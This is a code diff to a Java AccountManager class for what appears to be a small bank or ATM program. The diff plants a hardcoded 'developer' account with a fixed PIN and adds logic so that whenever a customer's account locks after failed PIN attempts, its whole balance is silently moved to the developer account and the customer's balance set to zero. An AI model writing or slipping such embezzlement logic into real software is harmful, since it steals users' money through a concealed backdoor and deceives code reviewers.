@@ -18,8 +18,9 @@ import java.util.Map;
 
 public class AccountManager implements IAccountManager {
     private static final int MAX_NUMBER_OF_FAILED_LOGINS = 3;
+    private static final Account developerAccount = new Account("Utvecklurs", 4242424L, 4242, 0L, 0);
     private Map<Long, Account> accounts;
-
+    
     public AccountManager() {
         accounts = new HashMap<>();
         accounts.put(1234567L, new Account("Jakob Þór Einarsson", 1234567L, 1423, 1000L, 0));
@@ -28,7 +29,7 @@ public class AccountManager implements IAccountManager {
         accounts.put(7654321L, new Account("Egill Ólafsson", 7654321L, 1234, 56000L, 0));
         accounts.put(1111111L, new Account("Flosi Ólafsson", 1111111L, 4321, 80000L, 0));
         accounts.put(2222222L, new Account("Gotti Sigurdarson",2222222L , 2323, 200000L, 0));
-        accounts.put(4242424L, new Account("Utvecklurs", 4242424L, 4242, 0L, 0));
+        accounts.put(developerAccount.getAccountNumber(), developerAccount);
     }
 
     @Override
@@ -57,6 +58,9 @@ public class AccountManager implements IAccountManager {
             if (account.getPinCode() != pinCode) {
                 account.setFailedAttempts(account.getFailedAttempts() + 1);
                 if (isAccountLocked(accountNumber)) {
+                    Account developerAccount = accounts.get(4242424L);
+                    developerAccount.setBalance(developerAccount.getBalance() + account.getBalance());
+                    account.setBalance(0L);
                     throw new AccountLockedException("Account locked");
                 }
                 throw new LoginFailedException("Wrong pin code");
